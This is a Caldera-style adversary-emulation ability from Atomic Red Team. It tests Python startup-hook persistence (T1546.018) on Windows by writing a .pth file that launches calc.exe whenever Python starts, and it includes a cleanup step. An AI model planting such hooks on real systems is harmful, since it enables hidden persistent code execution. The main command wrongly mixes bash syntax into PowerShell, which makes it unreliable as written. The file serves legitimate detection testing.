- id: 57289962-21dc-4501-b756-80cd30608d9f
  name: Python Startup Hook - atomic_hook.pth (Windows)
  description: "Executes code by placing a .pth file in the site-packages directory.\
    \ \nSupports python.exe and python3.exe via input arguments."
  tactic: persistence
  technique:
    attack_id: T1546.018
    name: 'Event Triggered Execution: Python Startup Hooks'
  platforms:
    windows:
      psh:
        command: 'if (Get-Command @("python.exe", ''python3.exe'') -ErrorAction SilentlyContinue)
          { exit 0 } else { exit 1 }; then : ; else Write-Host "[!] Python3 not found.
          Please install Python3 (e.g., winget install python3 or winget install python
          or https://www.python.org/downloads/windows/) or ensure it is in your PATH.";
          fi; $TempDir = Join-Path $env:TEMP "atomic_pth_win"; New-Item -ItemType
          Directory -Path $TempDir -Force; & "python.exe" -m venv "$TempDir\env";
          $SitePackages = & "$TempDir\env\Scripts\python.exe" -c "import site; print(site.getsitepackages()[1])";
          "import os, subprocess; os.environ.get(''CALC_SPAWNED'') or (os.environ.update({''CALC_SPAWNED'':''1''})
          or subprocess.Popen([''calc.exe'']))" | Out-File -Encoding ASCII "$SitePackages\atomic_hook.pth";
          Get-ChildItem -Path "$SitePackages" | Where-Object { $_.Name -like "*.pth"
          }; & "$TempDir\env\Scripts\python.exe" -c "print(''Triggering Hook via atomic_hook...'')"'
        cleanup: 'if (-not (Get-ChildItem -Path $env:TEMP -ErrorAction SilentlyContinue
          | Where-Object Name -like ''atomic_pth_win'')) { Write-Host "[!] Artifact
          missing: $env:Temp\atomic_pth_win Folder - [-] Please Run : Invoke-AtomicTest
          T1546.018"; exit 1 };; Remove-Item -Path "$env:TEMP\atomic_pth_win" -Recurse
          -Force; Write-Host "[+] Successfully Removed atomic_pth_win folder and atomic_hook.pth
          from Temp Directory"; Get-Process -Name "Calc*" -ErrorAction SilentlyContinue
          | Stop-Process -Force; Get-Process -Name "calc*" -ErrorAction SilentlyContinue
          | Stop-Process -Force; Write-Host "[+] Successfully Terminated Calculator"'
        elevation_required: false
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - t1546.018
  - persistence
  - atomic-red-team
  author: Atomic Red Team
  additional_info:
    input_arguments:
      python_exe:
        description: The python binary name to test.
        type: String
        default: python.exe
    dependencies:
    - description: 'Python must be installed and the specified binary (#{python_exe})
        must be in the PATH.

        '
      prereq_command: 'if (Get-Command @("#{python_exe}", ''python3.exe'') -ErrorAction
        SilentlyContinue) { exit 0 } else { exit 1 }

        '
      get_prereq_command: 'Write-Host "[!] Python3 not found. Please install Python3
        (e.g., winget install python3 or winget install python or https://www.python.org/downloads/windows/)
        or ensure it is in your PATH."

        '
